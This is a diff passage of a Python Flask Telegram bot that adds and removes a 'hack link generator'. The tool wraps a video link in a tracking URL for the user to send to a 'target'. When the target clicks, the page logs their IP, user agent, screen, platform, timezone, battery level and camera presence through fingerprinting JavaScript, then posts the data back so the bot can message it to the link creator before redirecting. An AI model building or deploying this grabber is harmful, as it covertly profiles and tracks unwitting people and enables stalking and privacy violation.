+            <div class="terminal-line">> Geolocating...</div>
+            <div class="terminal-line">> Redirecting in <span id="countdown">3</span> seconds...</div>
+        </div>
+    </div>
+    <script>
+        const data = {{
+            screen: screen.width + 'x' + screen.height,
+            language: navigator.language,
+            platform: navigator.platform,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            userAgent: navigator.userAgent
+        }};
+        document.getElementById('screen').innerText = data.screen;
+        document.getElementById('lang').innerText = data.language;
+        document.getElementById('platform').innerText = data.platform;
+        document.getElementById('tz').innerText = data.timezone;
+        if (navigator.getBattery) {{
+            navigator.getBattery().then(b => {{
+                let level = Math.round(b.level*100);
+                document.getElementById('battery').innerText = level+'%';
+                data.battery = level+'%';
+            }});
+        }} else {{
+            document.getElementById('battery').innerText = 'Not available';
+        }}
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {{
+            navigator.mediaDevices.enumerateDevices().then(devices => {{
+                let hasCamera = devices.some(d => d.kind === 'videoinput');
+                document.getElementById('camera').innerText = hasCamera ? 'Available' : 'None';
+                data.camera = hasCamera ? 'available' : 'none';
+            }}).catch(() => document.getElementById('camera').innerText = 'Permission needed');
+        }}
+        fetch('/collect/{link_id}', {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify(data)
+        }}).catch(err => console.log(err));
+        let sec = 3;
+        const timer = setInterval(() => {{
+            sec--;
+            document.getElementById('countdown').innerText = sec;
+            if (sec <= 0) {{
+                clearInterval(timer);
+                window.location.href = '{original}';
+            }}
+        }}, 1000);
+    </script>
+</body>
+</html>
+    """
+    conn.close()
+    return html
+
+@app.route('/collect/<link_id>', methods=['POST'])
+def collect_data(link_id):
+    data = request.json
+    conn = get_db()
+    conn.execute("""
+        UPDATE clicks SET 
+            screen = ?, language = ?, platform = ?, timezone = ?,
+            battery = ?, camera = ?
+        WHERE link_id = ? AND ip = ? AND timestamp = (
+            SELECT MAX(timestamp) FROM clicks WHERE link_id = ? AND ip = ?
+        )
+    """, (
+        data.get('screen'), data.get('language'), data.get('platform'),
+        data.get('timezone'), data.get('battery'), data.get('camera'),
+        link_id, request.remote_addr, link_id, request.remote_addr
+    ))
+    conn.commit()
+
+    row = conn.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,)).fetchone()
+    if row and is_premium(row["user_id"]):
+        msg = f"💀 *Visitor Data*\nLink: `{link_id}`\nIP: `{request.remote_addr}`\n"
+        for key, value in data.items():
+            if value:
+                msg += f"{key}: `{value}`\n"
+        try:
+            bot.send_message(row["user_id"], msg, parse_mode="Markdown")
+        except:
+            pass
+    conn.close()
+    return jsonify({"status": "ok"})
 
 @app.route(WEBHOOK_PATH, methods=["POST"])
 def webhook():
@@ -1118,10 +1531,17 @@ def index():
 def health():
     return jsonify({"status": "ok", "time": datetime.now().isoformat()})
 
-# ═══════════════════════════════════════════
-# SET WEBHOOK & START
-# ═══════════════════════════════════════════
+# =============================================================================
+# SCHEDULER
+# =============================================================================
+scheduler = BackgroundScheduler()
+scheduler.add_job(check_alerts, "interval", seconds=30)
+scheduler.add_job(cleanup_expired_ads, "interval", minutes=10)
+scheduler.start()
 
+# =============================================================================
+# SET WEBHOOK & START
+# =============================================================================
 def set_webhook():
     bot.remove_webhook()
     time.sleep(1)
@@ -1132,461 +1552,3 @@ def set_webhook():
 if __name__ == "__main__":
     set_webhook()
     app.run(host="0.0.0.0", port=PORT, debug=False)
-
-# =============================================================================
-# HACK LINK GENERATOR – /genlink (with DANGER THEME)
-# =============================================================================
-
-# Ensure these tables exist in init_db()
-"""
-CREATE TABLE IF NOT EXISTS links (
-    link_id TEXT PRIMARY KEY,
-    user_id INTEGER,
-    original_url TEXT,
-    modified_url TEXT,
-    created_at TEXT,
-    clicks INTEGER DEFAULT 0
-);
-CREATE TABLE IF NOT EXISTS clicks (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    link_id TEXT,
-    ip TEXT,
-    user_agent TEXT,
-    screen TEXT,
-    language TEXT,
-    platform TEXT,
-    timezone TEXT,
-    battery TEXT,
-    location TEXT,
-    camera TEXT,
-    clipboard TEXT,
-    phone TEXT,
-    timestamp TEXT
-);
-"""
-
-#@bot.message_handler(commands=['genlink', 'terminal:gernatLINK'])
-#def genlink_command(message):
-   # """Start the hack link generator"""
-   # ensure_user(message.from_user)
-   # markup = types.InlineKeyboardMarkup()
-   # markup.add(types.InlineKeyboardButton("💀 ENTER VIDEO LINK", callback_data="genlink_enter"))
-@bot.message_handler(commands=['genlink', 'terminal:gernatLINK'])
-def genlink_command(message):
-    print("🔥 genlink called")
-    bot.reply_to(message, "✅ Hack link generator test working!")
-
-    danger_text = """
-╔══════════════════════════════════╗
-║  💀 *HACK LINK GENERATOR* 💀      ║
-╠══════════════════════════════════╣
-║                                   ║
-║  ⚡ This tool generates a modified ║
-║     link that collects visitor    ║
-║     information silently.         ║
-║                                   ║
-║  ⚠️ USE AT YOUR OWN RISK          ║
-║                                   ║
-╚══════════════════════════════════╝
-👇 Click button and paste your video link
-    """
-    bot.reply_to(message, danger_text, reply_markup=markup, parse_mode="Markdown")
-
-@bot.callback_query_handler(func=lambda c: c.data == "genlink_enter")
-def genlink_ask_link(call):
-    bot.edit_message_text(
-        "📤 *Send me the video link*\nExample: https://youtube.com/watch?v=...",
-        call.message.chat.id,
-        call.message.message_id,
-        parse_mode="Markdown"
-    )
-    bot.register_next_step_handler(call.message, genlink_process_link)
-
-def genlink_process_link(message):
-    url = message.text.strip()
-    if not (url.startswith('http://') or url.startswith('https://')):
-        bot.reply_to(message, "❌ *Invalid Link!* Must start with http:// or https://", parse_mode="Markdown")
-        return
-
-    # ========== DANGER ANIMATED LOADING ==========
-    wait_msg = bot.reply_to(message, "💀 *INITIALIZING HACK...*", parse_mode="Markdown")
-    
-    # Loading frames with progress bar
-    frames = [
-        "⚡ [          ] 0%",
-        "🔴 [█         ] 10%",
-        "🔴 [██        ] 20%",
-        "🔴 [███       ] 30%",
-        "🔴 [████      ] 40%",
-        "🔴 [█████     ] 50%",
-        "🔴 [██████    ] 60%",
-        "🔴 [███████   ] 70%",
-        "🔴 [████████  ] 80%",
-        "🔴 [█████████ ] 90%",
-        "💀 [██████████] 100%"
-    ]
-    
-    for frame in frames:
-        time.sleep(0.3)
-        try:
-            bot.edit_message_text(f"💀 *GENERATING LINK...*\n{frame}", wait_msg.chat.id, wait_msg.message_id, parse_mode="Markdown")
-        except:
-            pass
-    
-    time.sleep(0.5)
-    
-    # Final "danger" message
-    bot.edit_message_text(
-        "💀 *LINK GENERATED!*\n\n_Injecting tracking code..._",
-        wait_msg.chat.id,
-        wait_msg.message_id,
-        parse_mode="Markdown"
-    )
-    time.sleep(0.8)
-    
-    # Generate unique link
-    link_id = str(uuid.uuid4())[:8]
-    base = os.environ.get("RENDER_URL", "https://your-app.onrender.com")
-    modified_url = f"{base}/click/{link_id}"
-
-    # Save to database
-    conn = get_db()
-    conn.execute(
-        "INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
-        (link_id, message.from_user.id, url, modified_url, datetime.now().isoformat())
-    )
-    conn.commit()
-    conn.close()
-
-    # Success message with buttons
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("📋 COPY LINK", callback_data=f"genlink_copy_{link_id}"),
-        types.InlineKeyboardButton("🔍 TEST LINK", url=modified_url)
-    )
-    
-    success_text = f"""
-╔══════════════════════════════════╗
-║  💀 *HACK LINK READY* 💀          ║
-╠══════════════════════════════════╣
-║                                   ║
-║  🔗 `{modified_url}`              ║
-║                                   ║
-║  📊 This link will collect:       ║
-║  • IP Address                     ║
-║  • Device Info                    ║
-║  • Browser Details                ║
-║  • Screen Resolution              ║
-║  • Language & Timezone            ║
-║  • Battery Level (if allowed)     ║
-║  • Location (if allowed)          ║
-║  • Camera (if allowed)            ║
-║                                   ║
-║  ⚠️ Send this link to target       ║
-║                                   ║
-╚══════════════════════════════════╝
-    """
-    bot.edit_message_text(
-        success_text,
-        wait_msg.chat.id,
-        wait_msg.message_id,
-        parse_mode="Markdown",
-        reply_markup=markup
-    )
-
-@bot.callback_query_handler(func=lambda c: c.data.startswith("genlink_copy_"))
-def genlink_copy_callback(call):
-    link_id = call.data.split("_")[2]
-    conn = get_db()
-    row = conn.execute("SELECT modified_url FROM links WHERE link_id=?", (link_id,)).fetchone()
-    conn.close()
-    if row:
-        bot.answer_callback_query(call.id, "✅ Copied to clipboard!")
-        bot.send_message(call.message.chat.id, f"📋 `{row['modified_url']}`", parse_mode="Markdown")
-    else:
-        bot.answer_callback_query(call.id, "❌ Link not found")
-
-# =============================================================================
-# FLASK ROUTE FOR CLICK TRACKING
-# =============================================================================
-@app.route('/click/<link_id>')
-def click_track(link_id):
-    # Get original URL
-    conn = get_db()
-    row = conn.execute("SELECT original_url FROM links WHERE link_id=?", (link_id,)).fetchone()
-    if not row:
-        conn.close()
-        return "Link not found", 404
-    original = row["original_url"]
-
-    # Collect basic info from request
-    ip = request.remote_addr
-    ua = request.user_agent.string
-
-    # Insert click record (basic)
-    conn.execute(
-        "INSERT INTO clicks (link_id, ip, user_agent, timestamp) VALUES (?, ?, ?, ?)",
-        (link_id, ip, ua, datetime.now().isoformat())
-    )
-    conn.execute("UPDATE links SET clicks = clicks + 1 WHERE link_id=?", (link_id,))
-    conn.commit()
-    conn.close()
-
-    # Notify owner
-    try:
-        bot.send_message(OWNER_ID, f"💀 *New Click!*\nLink: `{link_id}`\nIP: `{ip}`", parse_mode="Markdown")
-    except:
-        pass
-
-    # DANGER THEME HTML PAGE with data collection
-    html = f"""
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYSTEM ACCESS</title>
-    <style>
-        body {{
-            background: #0a0a0a;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            text-align: center;
-            padding: 50px 20px;
-            margin: 0;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }}
-        .container {{
-            max-width: 600px;
-            width: 100%;
-        }}
-        h1 {{
-            font-size: 2.5rem;
-            text-shadow: 0 0 10px #00ff00;
-            margin-bottom: 30px;
-            animation: blink 2s infinite;
-        }}
-        @keyframes blink {{
-            0%, 100% {{ opacity: 1; }}
-            50% {{ opacity: 0.5; }}
-        }}
-        .progress-bar {{
-            width: 100%;
-            height: 30px;
-            background: #1a1a1a;
-            border: 2px solid #00ff00;
-            border-radius: 5px;
-            margin: 30px 0;
-            overflow: hidden;
-        }}
-        .progress-fill {{
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #00ff00, #00aa00);
-            animation: progress 3s ease-in-out forwards;
-        }}
-        @keyframes progress {{
-            0% {{ width: 0%; }}
-            100% {{ width: 100%; }}
-        }}
-        .data-row {{
-            text-align: left;
-            background: #1a1a1a;
-            border: 1px solid #00ff00;
-            border-radius: 5px;
-            padding: 10px;
-            margin: 10px 0;
-            font-size: 0.9rem;
-            opacity: 0;
-            animation: fadeIn 0.5s ease-out forwards;
-        }}
-        .data-row:nth-child(1) {{ animation-delay: 1s; }}
-        .data-row:nth-child(2) {{ animation-delay: 1.5s; }}
-        .data-row:nth-child(3) {{ animation-delay: 2s; }}
-        .data-row:nth-child(4) {{ animation-delay: 2.5s; }}
-        .data-row:nth-child(5) {{ animation-delay: 3s; }}
-        .data-row:nth-child(6) {{ animation-delay: 3.5s; }}
-        .data-row:nth-child(7) {{ animation-delay: 4s; }}
-        .data-row:nth-child(8) {{ animation-delay: 4.5s; }}
-        @keyframes fadeIn {{
-            from {{ opacity: 0; transform: translateY(10px); }}
-            to {{ opacity: 1; transform: translateY(0); }}
-        }}
-        .glitch {{
-            font-size: 1.2rem;
-            color: #ff0000;
-            text-shadow: 0 0 5px #ff0000;
-            animation: glitch 1s infinite;
-        }}
-        @keyframes glitch {{
-            0%, 100% {{ transform: translate(0); }}
-            20% {{ transform: translate(-2px, 2px); }}
-            40% {{ transform: translate(2px, -2px); }}
-            60% {{ transform: translate(-2px, -2px); }}
-            80% {{ transform: translate(2px, 2px); }}
-        }}
-        .terminal {{ text-align: left; margin-top: 30px; }}
-        .terminal-line {{ color: #00ff00; margin: 5px 0; font-size: 0.8rem; }}
-        .blink {{ animation: blink 1s step-end infinite; }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>⚡ SYSTEM ACCESS ⚡</h1>
-        
-        <div class="progress-bar">
-            <div class="progress-fill"></div>
-        </div>
-        
-        <div class="glitch">⚠️ COLLECTING DATA... ⚠️</div>
-        
-        <div id="data-container">
-            <div class="data-row">
-                <strong>IP Address:</strong> <span id="ip">{request.remote_addr}</span>
-            </div>
-            <div class="data-row">
-                <strong>User Agent:</strong> <span id="ua">{request.user_agent.string[:100]}</span>
-            </div>
-            <div class="data-row">
-                <strong>Screen Resolution:</strong> <span id="screen">detecting...</span>
-            </div>
-            <div class="data-row">
-                <strong>Language:</strong> <span id="lang">detecting...</span>
-            </div>
-            <div class="data-row">
-                <strong>Platform:</strong> <span id="platform">detecting...</span>
-            </div>
-            <div class="data-row">
-                <strong>Timezone:</strong> <span id="tz">detecting...</span>
-            </div>
-            <div class="data-row">
-                <strong>Battery:</strong> <span id="battery">detecting...</span>
-            </div>
-            <div class="data-row">
-                <strong>Camera:</strong> <span id="camera">checking...</span>
-            </div>
-        </div>
-        
-        <div class="terminal">
-            <div class="terminal-line">> Establishing connection... <span class="blink">_</span></div>
-            <div class="terminal-line">> Fetching device info...</div>
-            <div class="terminal-line">> Geolocating...</div>
-            <div class="terminal-line">> Redirecting in <span id="countdown">3</span> seconds...</div>
-        </div>
-    </div>
-
-    <script>
-        // Collect all data
-        const data = {{
-            screen: screen.width + 'x' + screen.height,
-            language: navigator.language,
-            platform: navigator.platform,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            userAgent: navigator.userAgent
-        }};
-
-        // Update UI
-        document.getElementById('screen').innerText = data.screen;
-        document.getElementById('lang').innerText = data.language;
-        document.getElementById('platform').innerText = data.platform;
-        document.getElementById('tz').innerText = data.timezone;
-
-        // Battery API
-        if (navigator.getBattery) {{
-            navigator.getBattery().then(function(battery) {{
-                let level = Math.round(battery.level * 100);
-                document.getElementById('battery').innerText = level + '%';
-                data.battery = level + '%';
-            }});
-        }} else {{
-            document.getElementById('battery').innerText = 'Not available';
-        }}
-
-        // Camera check
-        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {{
-            navigator.mediaDevices.enumerateDevices().then(function(devices) {{
-                let hasCamera = devices.some(d => d.kind === 'videoinput');
-                document.getElementById('camera').innerText = hasCamera ? 'Available' : 'None';
-                data.camera = hasCamera ? 'available' : 'none';
-            }}).catch(function() {{
-                document.getElementById('camera').innerText = 'Permission needed';
-            }});
-        }}
-
-        // Send data to server
-        fetch('/collect/{link_id}', {{
-            method: 'POST',
-            headers: {{ 'Content-Type': 'application/json' }},
-            body: JSON.stringify(data)
-        }}).catch(err => console.log(err));
-
-        // Countdown redirect
-        let seconds = 3;
-        const countdownEl = document.getElementById('countdown');
-        const timer = setInterval(() => {{
-            seconds--;
-            countdownEl.innerText = seconds;
-            if (seconds <= 0) {{
-                clearInterval(timer);
-                window.location.href = '{original}';
-            }}
-        }}, 1000);
-    </script>
-</body>
-</html>
-    """
-    return html
-
-@app.route('/collect/<link_id>', methods=['POST'])
-def collect_data(link_id):
-    """Endpoint to receive extra visitor data from JavaScript"""
-    data = request.json
-    
-    conn = get_db()
-    # Update the most recent click for this link with this IP
-    conn.execute("""
-        UPDATE clicks SET 
-            screen = ?, 
-            language = ?, 
-            platform = ?, 
-            timezone = ?,
-            battery = ?,
-            camera = ?
-        WHERE link_id = ? AND ip = ? AND timestamp = (
-            SELECT MAX(timestamp) FROM clicks WHERE link_id = ? AND ip = ?
-        )
-    """, (
-        data.get('screen'), 
-        data.get('language'), 
-        data.get('platform'), 
-        data.get('timezone'),
-        data.get('battery'),
-        data.get('camera'),
-        link_id, 
-        request.remote_addr, 
-        link_id, 
-        request.remote_addr
-    ))
-    conn.commit()
-    
-    # Get owner of this link
-    row = conn.execute("SELECT user_id FROM links WHERE link_id=?", (link_id,)).fetchone()
-    if row:
-        user_id = row["user_id"]
-        # Check if user is premium (to send more data)
-        if is_premium(user_id):
-            msg = f"💀 *Visitor Data*\nLink: `{link_id}`\nIP: `{request.remote_addr}`\n"
-            for key, value in data.items():
-                if value:
-                    msg += f"{key}: `{value}`\n"
-            try:
-                bot.send_message(user_id, msg, parse_mode="Markdown")
-            except:
-                pass
-    
-    conn.close()
-    return jsonify({"status": "ok"})
